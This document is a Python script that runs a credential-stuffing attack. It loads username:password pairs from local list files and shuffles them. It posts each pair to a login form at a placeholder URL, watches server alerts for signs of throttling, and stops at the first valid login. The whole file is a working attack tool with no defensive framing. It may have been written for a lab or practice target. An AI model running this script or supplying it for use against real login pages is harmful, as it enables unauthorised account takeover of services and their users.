# Do you have these libraries installed?
import requests
from tqdm import tqdm
from bs4 import BeautifulSoup
import random
from datetime import datetime
from requests.auth import HTTPBasicAuth

# Replace with your own paths
PATH_TO_CREDENTIAL_1 = "./" + "credentials1.txt"
PATH_TO_CREDENTIAL_2 = "./" + "credentials2.txt"
# Replace with the correct URL and port
BASE_URL = 'http://<url>:<port>'


def process_credentials(username, password, session, base_url):
    """Returns: (success_status)"""
    try:
        response = session.post(f'{base_url}/', data={'username': username, 'password': password})

        # need to catch 404s or 401s
        if response.status_code != 200:
            print(f"Error: {response.text}")
            raise Exception(f"Error: {response.text}")
            
        # Display server messages
        soup = BeautifulSoup(response.text, 'html.parser')
        for alert in soup.find_all('div', class_='alert'):
            class_list = alert.get('class', [])
            alert_type = 'Server' if 'alert-danger' in class_list or 'alert-success' in class_list else 'Warning'
            if alert_type == "Warning":
                alert_text = f"\033[93m{alert.text.strip()}\033[0m"
            else:
                alert_text = alert.text.strip()    

            # Print the timestamp, alert type, and alert text. This will help detect if the server is throttling us.
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            tqdm.write(f"{timestamp}: {alert_type}: {alert_text}")
        
        # Check if the response contains the success message or if the URL ends with '/success'
        if "Login successful" in response.text or response.url.endswith('/credentials'):
            print("\n\033[92mValid credentials found!\033[0m")
            print(f"\033[94mUsername: {username}\033[0m\n\033[94mPassword: {password}\033[0m")
            print(f"Let's try logging in?\n")
            return True
                
        return False
    
    except KeyboardInterrupt:
        raise
    except Exception as e:
        print(f"Error: {e}")
        return False

def main():
    base_url = BASE_URL
    session = requests.Session()
    current_list = input("Initial credential list (1/2): ").strip()
    
    if current_list == '1':
        credential_list = PATH_TO_CREDENTIAL_1
    elif current_list == '2':
        credential_list = PATH_TO_CREDENTIAL_2
    else:
        print("Invalid credential list")
        return

    # Load the credential list
    credential_list = open(credential_list, 'r').readlines()
    # Remove the newline characters
    credential_list = [line.strip() for line in credential_list]
    # Split the username and password
    credential_list = [line.split(':') for line in credential_list]
    # Randomize the credential list
    random.shuffle(credential_list)

    # Create progress bar for the entire credential list
    with tqdm(total=len(credential_list), desc=f"Testing List {current_list}") as pbar:
        # Iterate over the credential list
        for username, password in credential_list:
            try:
                success = process_credentials(username, password, session, base_url)
                pbar.update(1)
                if success:
                    break
            except KeyboardInterrupt:
                break
            except Exception as e:
                print(f"Error: {e}")
                break


if __name__ == "__main__":
    main()
